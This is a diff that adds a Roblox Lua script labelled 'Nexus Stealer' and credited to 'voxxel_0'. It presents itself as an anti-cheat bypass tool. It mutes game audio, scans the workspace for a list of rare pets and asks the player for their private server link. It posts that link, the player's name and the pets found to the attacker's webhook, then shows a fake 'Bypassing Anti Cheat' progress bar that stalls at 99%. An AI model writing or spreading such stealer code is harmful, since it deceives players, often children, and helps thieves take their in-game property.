@@ -1,0 +1,265 @@
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local SoundService = game:GetService("SoundService")
+
+local function mutarSom(som)
+    if som:IsA("Sound") then
+        som.Volume = 0
+        som:Stop()
+    end
+end
+
+local function mutarDescendentes(instancia)
+    for _, obj in ipairs(instancia:GetDescendants()) do
+        mutarSom(obj)
+    end
+end
+
+local pastas = {game.Workspace, game.Players, game.ReplicatedStorage, game.Lighting, game.StarterGui, game.StarterPack}
+
+for _, pasta in ipairs(pastas) do
+    mutarDescendentes(pasta)
+    
+    pasta.DescendantAdded:Connect(function(obj)
+        mutarSom(obj)
+    end)
+end
+
+getgenv().webhook = "WEBHOOK--HERE"
+getgenv().websiteEndpoint = nil
+
+getgenv().TargetPetNames = {
+    "Graipuss Medussi",
+    "La Grande Combinasion", "Garama and Madundung", "Tralaledon",
+    "Pot Hotspot",
+    "Nuclearo Dinossauro",  
+    "Chicleteira Bicicleteira", "Los Combinasionas", "Dragon Cannelloni",
+    "Los Bros", "Esok Sekolah", "Ketupat Kepat", "Las Sis", "Los Hotspotsitos",
+    "La Supreme Combinasion", "Ketchuru and Musturo", "Spaghetti Tualetti",
+    "La Sahur Combinasion", "Los Bicicleteira", "Strawberry Elephant",
+}
+
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+
+local function sendPetWebhook(foundPets, privateServerLink)
+    local petCounts = {}
+    for _, pet in ipairs(foundPets) do
+        petCounts[pet] = (petCounts[pet] or 0) + 1
+    end
+
+    local formattedPets = {}
+    for petName, count in pairs(petCounts) do
+        table.insert(formattedPets, petName .. (count > 1 and " x" .. count or ""))
+    end
+
+    local executorName = LocalPlayer.Name
+
+    local embedData = {
+        username = "Nexus Stealer",
+        content = "@everyone",
+        embeds = { {
+            title = "SAB HIT  🔥",
+            color = 3447003,
+            fields = {
+                {
+                    name = "User  👤",
+                    value = executorName,
+                    inline = false
+                },
+                {
+                    name = "Players   👥",
+                    value = string.format("%d/%d", #Players:GetPlayers(), Players.MaxPlayers),
+                    inline = false
+                },
+                {
+                    name = "Server Link   🔗",
+                    value = privateServerLink ~= "" and privateServerLink or "No link provided",
+                    inline = false
+                },
+                {
+                    name = "Brainrots   🐾",
+                    value = #formattedPets > 0 and table.concat(formattedPets, "\n") or "No pets found",
+                    inline = false
+                }
+            },
+            footer = { text = "Made By voxxel_0" },
+            timestamp = DateTime.now():ToIsoDate()
+        } }
+    }
+
+    local jsonData = HttpService:JSONEncode(embedData)
+    local req = http_request or request or (syn and syn.request)
+    if req then
+        local success, err = pcall(function()
+            req({
+                Url = getgenv().webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData
+            })
+        end)
+        if success then
+            print("✅ Webhook sent")
+        else
+            warn("❌ Webhook failed:", err)
+        end
+    else
+        warn("❌ No HTTP request function available")
+    end
+end
+
+local function checkForPets()
+    local found = {}
+    for _, obj in pairs(workspace:GetDescendants()) do
+        if obj:IsA("Model") then
+            local nameLower = string.lower(obj.Name)
+            for _, target in pairs(getgenv().TargetPetNames) do
+                if string.find(nameLower, string.lower(target)) then
+                    table.insert(found, obj.Name)
+                    break
+                end
+            end
+        end
+    end
+    return found
+end
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = CoreGui
+ScreenGui.IgnoreGuiInset = true
+
+local Background = Instance.new("Frame")
+Background.Size = UDim2.new(1,0,1,0)
+Background.BackgroundColor3 = Color3.fromRGB(20,20,20)
+Background.Parent = ScreenGui
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(0.8,0,0.15,0)
+Title.Position = UDim2.new(0.1,0,0.3,0)
+Title.BackgroundTransparency = 1
+Title.Text = "Enter your server link"
+Title.TextColor3 = Color3.fromRGB(255,255,255)
+Title.Font = Enum.Font.GothamBlack
+Title.TextScaled = true
+Title.Parent = Background
+
+local InputBox = Instance.new("TextBox")
+InputBox.Size = UDim2.new(0.6,0,0.08,0)
+InputBox.Position = UDim2.new(0.2,0,0.5,0)
+InputBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
+InputBox.TextColor3 = Color3.fromRGB(0,0,0)
+InputBox.PlaceholderText = "private server link here..."
+InputBox.Text = ""
+InputBox.Font = Enum.Font.Gotham
+InputBox.TextScaled = true
+InputBox.Parent = Background
+
+local StartButton = Instance.new("TextButton")
+StartButton.Size = UDim2.new(0.3,0,0.08,0)
+StartButton.Position = UDim2.new(0.35,0,0.62,0)
+StartButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+StartButton.TextColor3 = Color3.fromRGB(255,255,255)
+StartButton.Text = "Start"
+StartButton.Font = Enum.Font.GothamBold
+StartButton.TextScaled = true
+StartButton.Parent = Background
+
+local function UpdateButton()
+    if InputBox.Text ~= "" then
+        StartButton.BackgroundColor3 = Color3.fromRGB(0,170,0)
+        StartButton.Active = true
+    else
+        StartButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        StartButton.Active = false
+    end
+end
+InputBox:GetPropertyChangedSignal("Text"):Connect(UpdateButton)
+UpdateButton()
+
+local function CreateBypassGUI()
+    ScreenGui:Destroy()
+    
+    local BypassScreenGui = Instance.new("ScreenGui")
+    BypassScreenGui.Parent = CoreGui
+    BypassScreenGui.IgnoreGuiInset = true
+    BypassScreenGui.Name = "BypassGUI"
+
+    local BypassBackground = Instance.new("Frame")
+    BypassBackground.Size = UDim2.new(1,0,1,0)
+    BypassBackground.BackgroundColor3 = Color3.fromRGB(20,20,20)
+    BypassBackground.Parent = BypassScreenGui
+
+    local BypassTitle = Instance.new("TextLabel")
+    BypassTitle.Size = UDim2.new(0.8,0,0.15,0)
+    BypassTitle.Position = UDim2.new(0.1,0,0.2,0)
+    BypassTitle.BackgroundTransparency = 1
+    BypassTitle.Text = "Bypassing Anti Cheat"
+    BypassTitle.TextColor3 = Color3.fromRGB(255,255,255)
+    BypassTitle.Font = Enum.Font.GothamBlack
+    BypassTitle.TextScaled = true
+    BypassTitle.Parent = BypassBackground
+
+    local LoadingBarBackground = Instance.new("Frame")
+    LoadingBarBackground.Size = UDim2.new(0.6,0,0.05,0)
+    LoadingBarBackground.Position = UDim2.new(0.2,0,0.4,0)
+    LoadingBarBackground.BackgroundColor3 = Color3.fromRGB(60,60,60)
+    LoadingBarBackground.BorderSizePixel = 0
+    LoadingBarBackground.Parent = BypassBackground
+
+    local LoadingBar = Instance.new("Frame")
+    LoadingBar.Size = UDim2.new(0,0,1,0)
+    LoadingBar.Position = UDim2.new(0,0,0,0)
+    LoadingBar.BackgroundColor3 = Color3.fromRGB(0,170,0)
+    LoadingBar.BorderSizePixel = 0
+    LoadingBar.Parent = LoadingBarBackground
+
+    local PercentageText = Instance.new("TextLabel")
+    PercentageText.Size = UDim2.new(0.6,0,0.1,0)
+    PercentageText.Position = UDim2.new(0.2,0,0.5,0)
+    PercentageText.BackgroundTransparency = 1
+    PercentageText.Text = "0%"
+    PercentageText.TextColor3 = Color3.fromRGB(255,255,255)
+    PercentageText.Font = Enum.Font.GothamBold
+    PercentageText.TextScaled = true
+    PercentageText.Parent = BypassBackground
+
+    local startTime = tick()
+    local duration = 180
+    
+    local function updateLoading()
+        local elapsed = tick() - startTime
+        local progress = math.min(elapsed / duration, 0.99)
+        
+        LoadingBar.Size = UDim2.new(progress, 0, 1, 0)
+        
+        local percent = math.floor(progress * 100)
+        PercentageText.Text = percent .. "%"
+        
+        if progress < 0.99 then
+            wait(0.1)
+            updateLoading()
+        else
+            PercentageText.Text = "99%"
+        end
+    end
+    
+    spawn(updateLoading)
+end
+
+StartButton.MouseButton1Click:Connect(function()
+    if InputBox.Text ~= "" then
+        local privateServerLink = InputBox.Text
+        
+        local petsFound = checkForPets()
+        if #petsFound > 0 then
+            print("✅ Pets found:", table.concat(petsFound, ", "))
+            sendPetWebhook(petsFound, privateServerLink)
+        else
+            print("🔍 No pets found")
+        end
+
+        CreateBypassGUI()
+        print("Link enviado:", privateServerLink)
+    end
+end)
